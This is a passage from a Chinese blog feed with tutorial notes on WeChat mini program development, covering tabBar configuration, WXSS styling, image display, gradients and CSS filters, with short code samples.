class="punctuation">:</span> <span class="string">&quot;座位&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/list/list&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击前的图标</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1-active.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;个人&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/more/more&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab4-active.png&quot;</span><span class="punctuation">,</span><span class="comment">//点击后的图标</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;更多&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里有一个比较重要的属性就是list，它是一个<strong>数组</strong>，决定了tabBar上面的文字、icon、以及点击之后的跳转链接。</p><ul><li>pagePath<strong>必须为</strong>我们在pages配置项里建好的页面</li><li>text是tab按钮上的文字</li><li>iconPath、selectedIconPath分别为没有选中时的图片路径和选中时的图片路径。</li></ul><h2 id="0x02-WXML与WXSS"><a href="#0x02-WXML与WXSS" class="headerlink" title="0x02 WXML与WXSS"></a>0x02 WXML与WXSS</h2><h3 id="0x001-字体与文本属性"><a href="#0x001-字体与文本属性" class="headerlink" title="0x001 字体与文本属性"></a>0x001 字体与文本属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x002-盒模型属性"><a href="#0x002-盒模型属性" class="headerlink" title="0x002 盒模型属性"></a>0x002 盒模型属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><h2 id="0x03-链接与图片"><a href="#0x03-链接与图片" class="headerlink" title="0x03 链接与图片"></a>0x03 链接与图片</h2><h3 id="0x001-navigator组件"><a href="#0x001-navigator组件" class="headerlink" title="0x001 navigator组件"></a>0x001 navigator组件</h3><p>为了让二级页面与tabBar的页面有更加清晰的结构关系，我们可以在tabBar对应的页面文件夹下面新建要跳转的页面。比如我们的第一个tabBar是home，凡是home会跳转的二级页面，我们都建在home文件夹里。</p><p>新建一个页面imgshow</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-link&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;./../home/imgshow/imgshow&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item-link&quot;</span>&gt;</span>让小程序显示图片<span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-link</span>&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">10px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#4ea6ec</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链接内容可以是绝对路径也可以是相对路径</p><h3 id="0x002-相对路径与绝对路径"><a href="#0x002-相对路径与绝对路径" class="headerlink" title="0x002 相对路径与绝对路径"></a>0x002 相对路径与绝对路径</h3><p><strong>相对路径</strong></p><p>大家注意我们之前使用的路径基本都是相对路径，相对路径使用“&#x2F;”字符作为目录的分隔字符，</p><ul><li>“.&#x2F;“ 代表当前目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;./img/icon.jpg&quot; /&gt;等同于&lt;img src=&quot;img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure><ul><li><p>“..&#x2F;” 代表上一级目录</p></li><li><p>“&#x2F;“  <strong>当前根目录</strong>，是相对目录；</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/img/icon.jpg&quot; /&gt;</span><br></pre></td></tr></table></figure><p><strong>绝对路径</strong></p><p>网络链接就是绝对路径，还有C:*Windows*\System32，这种从<strong>盘符开始</strong>的路径也是绝对路径。通常相对路径用的会比较多一些。</p><h3 id="0x003-云存储"><a href="#0x003-云存储" class="headerlink" title="0x003 云存储"></a>0x003 云存储</h3><p><strong>免费的图床：</strong><a href="https://cloud.tencent.com/login">腾讯云对象存储COS</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-尺寸单位rpx"><a href="#0x004-尺寸单位rpx" class="headerlink" title="0x004 尺寸单位rpx"></a>0x004 尺寸单位rpx</h3><p>所有的手机屏幕的宽度都为750rpx</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">700</span>rpx;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">415</span>rpx;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-图片的裁剪"><a href="#0x005-图片的裁剪" class="headerlink" title="0x005 图片的裁剪"></a>0x005 图片的裁剪</h3><p>引入widthFix：<strong>宽度不变，高度自动变化，保持原图宽高比不变</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgitem&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.imgitem</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>希望图片全屏显示，但是设计师却只给图片预留了一个很小的高度，这样我们就必须对图片进行一定的裁剪了，我们可以在imgshow.wxml这样写。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;imgfull&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;center&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.imglist .imgfull&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x006-背景属性"><a href="#0x006-背景属性" class="headerlink" title="0x006 背景属性"></a>0x006 背景属性</h3><table><thead><tr><th align="center">背景属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background.asp">background</a></td><td>在一个声明中设置所有的背景属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-color.asp">background-color</a></td><td>设置元素的背景颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-image.asp">background-image</a></td><td>设置元素的背景图像。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-size.asp">background-size</a></td><td>规定背景图片的尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_background-repeat.asp">background-repeat</a></td><td>设置是否及如何重复背景图像。</td></tr></tbody></table><p>给id为wxmlinfo的view组件加一个背景颜色以及id为studyweapp的view组件添加一个背景图片：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#wxmlinfo</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#dae7d9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#studyweapp</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/bg.png</span>);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写在wxss里的图片只能来自服务器或者图床，不能放在小程序的文件结构里，这是小程序的一个规定。</p><h3 id="0x007-图片的边框美化"><a href="#0x007-图片的边框美化" class="headerlink" title="0x007 图片的边框美化"></a>0x007 图片的边框美化</h3><p>圆角和阴影样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.img</span>&#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">53</span>,<span class="number">178</span>,<span class="number">225</span>,<span class="number">0.26</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>border-radius为图片圆角设置</p><p>box-shadow为图片增加阴影</p><p>把图片做成圆形</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/logo.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.circle</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-渐变与动画"><a href="#0x04-渐变与动画" class="headerlink" title="0x04 渐变与动画"></a>0x04 渐变与动画</h2><h3 id="0x001-渐变Gradient"><a href="#0x001-渐变Gradient" class="headerlink" title="0x001 渐变Gradient"></a>0x001 渐变Gradient</h3><p>新建gradient界面，在wxml文件中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;gradient-display&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并在wxss文件中输入：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.gradient-display</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(red, blue);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此处背景图片使用了linear-gradient属性，默认渐变方向是从上到下，由红到蓝</p><h3 id="0x002-改变渐变的方向"><a href="#0x002-改变渐变的方向" class="headerlink" title="0x002 改变渐变的方向"></a>0x002 改变渐变的方向</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, blue, red);</span><br><span class="line"><span class="comment">/*将背景变为 *渐变轴为45度，从蓝色渐变到红色*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(to left top, blue, red);</span><br><span class="line"><span class="comment">/*从右下到左上、从蓝色渐变到红色*/</span></span><br></pre></td></tr></table></figure><h3 id="0x003-增加更多颜色变换"><a href="#0x003-增加更多颜色变换" class="headerlink" title="0x003 增加更多颜色变换"></a>0x003 增加更多颜色变换</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(<span class="number">0deg</span>, blue, green <span class="number">40%</span>, red);<span class="comment">/*从下到上（渐变轴为0度），从蓝色开始渐变、到高度40%位置是绿色渐变开始、最后以红色结束*/</span></span><br></pre></td></tr></table></figure><h3 id="0x004-增加颜色的百分比"><a href="#0x004-增加颜色的百分比" class="headerlink" title="0x004 增加颜色的百分比"></a>0x004 增加颜色的百分比</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">19deg</span>, <span class="built_in">rgb</span>(<span class="number">33</span>, <span class="number">212</span>, <span class="number">253</span>) <span class="number">0%</span>, <span class="built_in">rgb</span>(<span class="number">183</span>, <span class="number">33</span>, <span class="number">255</span>) <span class="number">100%</span>);</span><br></pre></td></tr></table></figure><h3 id="0x005-Filter滤镜"><a href="#0x005-Filter滤镜" class="headerlink" title="0x005 Filter滤镜"></a>0x005 Filter滤镜</h3><p>filter属性可以对图片进行高斯模糊、调整对比度、转换为灰度图像、色相旋转、图片透明等操作</p><p>新建的filter页面</p><p>在wxml文件中嵌入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>blur高斯模糊<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;blur&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>grayscale图片变灰<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>opacity图片透明<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;opacity&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>多个滤镜叠加，注意css的写法即可<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在wxss文件中嵌入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.filter-display</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.blur</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.opacity</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.multiple</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>) <span class="built_in">grayscale</span>(<span class="number">90%</span>) <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现图片的依次变化</p><p>关键词：blur grayscale opacity filter</p><h3 id="0x006-图片由灰色变为彩色"><a href="#0x006-图片由灰色变为彩色" class="headerlink" title="0x006 图片由灰色变为彩色"></a>0x006 图片由灰色变为彩色</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>将鼠标悬停（模拟器）或手指（手机微信）按住或放开图片查看效果<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;grayscale-hover&quot;</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wxss</span><br><span class="line"><span class="selector-class">.filter-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale-hover</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>:<span class="built_in">grayscale</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[2]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development-2/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x007-高斯模糊的背景"><a href="#0x007-高斯模糊的背景" class="headerlink" title="0x007 高斯模糊的背景"></a>0x007 高斯模糊的背景</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;userinfo-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;blur-bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;user-img&quot;</span>&gt;</span></span><br><span class="line">        